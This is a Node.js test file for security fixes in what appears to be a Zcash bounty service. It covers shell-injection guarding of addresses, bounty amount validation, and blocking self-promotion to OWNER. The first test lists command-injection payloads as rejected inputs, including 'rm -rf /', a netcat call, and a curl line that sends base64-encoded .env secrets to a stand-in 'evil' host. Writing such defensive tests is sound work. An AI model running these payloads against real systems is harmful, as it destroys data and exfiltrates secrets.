const test = require("node:test");
const assert = require("node:assert/strict");

const { isSafeShieldedAddress } = require("../helpers/validateAddress.js");
const { isSettableMemberRole } = require("../helpers/teamRoles.js");
const { validateBountyUpdate } = require("../helpers/validateBounty.js");

// ── Fix 1: command injection guard on /auth/verify-(z|u)address ──────────────
// The address reaches zingo-cli's parse_address. Any shell metacharacter must
// be rejected before it gets there.
test("isSafeShieldedAddress rejects shell metacharacters and injection payloads", () => {
  const malicious = [
    "u1aaa; id",
    "u1aaa && rm -rf /",
    "u1aaa | nc evil 1",
    "u1aaa`id`",
    "u1aaa$(cat .env)",
    "u1aaa; curl http://evil/$(base64 .env)",
    "u1aaa\nmalicious",
    "u1aaa\r\nmalicious",
    "u1aaa 'quoted'",
    'u1aaa "quoted"',
    "u1aaa\\backslash",
    "short", // below min length
    "",
    null,
    undefined,
    12345,
    "u1aaa" + "a".repeat(600), // above max length
  ];
  for (const payload of malicious) {
    assert.equal(
      isSafeShieldedAddress(payload),
      false,
      `must reject: ${JSON.stringify(payload)}`,
    );
  }
});

test("isSafeShieldedAddress accepts a normal base58/bech32 address", () => {
  assert.equal(isSafeShieldedAddress("u1qqqqqqqqqqqqqqqqqqpk8rkp5a"), true);
  assert.equal(
    isSafeShieldedAddress("zs1z7rejlpsa98s2rrrfkwmaxu53e4ue0ulcrw0h4x5g8jl04tak0d3"),
    true,
  );
});

// ── Fix 2: payout amount is now validated on bounty edit ─────────────────────
// validateBountyUpdate was imported but never called, so bountyAmount reached
// the DB unchecked. These assert it now rejects non-positive / non-finite.
test("validateBountyUpdate rejects a non-positive or non-finite reward", () => {
  assert.equal(validateBountyUpdate({ bountyAmount: -5 }).valid, false);
  assert.equal(validateBountyUpdate({ bountyAmount: 0 }).valid, false);
  assert.equal(validateBountyUpdate({ bountyAmount: "not-a-number" }).valid, false);
  assert.equal(validateBountyUpdate({ bountyAmount: Infinity }).valid, false);
});

test("validateBountyUpdate accepts a valid partial update", () => {
  assert.equal(validateBountyUpdate({ bountyAmount: 0.1 }).valid, true);
  assert.equal(validateBountyUpdate({}).valid, true);
});

// ── Fix 3: a team admin cannot self-promote to OWNER ─────────────────────────
test("isSettableMemberRole forbids OWNER and allows ADMIN/MEMBER", () => {
  assert.equal(isSettableMemberRole("OWNER"), false);
  assert.equal(isSettableMemberRole("ADMIN"), true);
  assert.equal(isSettableMemberRole("MEMBER"), true);
  assert.equal(isSettableMemberRole("owner"), false);
  assert.equal(isSettableMemberRole("SUPERADMIN"), false);
  assert.equal(isSettableMemberRole(undefined), false);
});
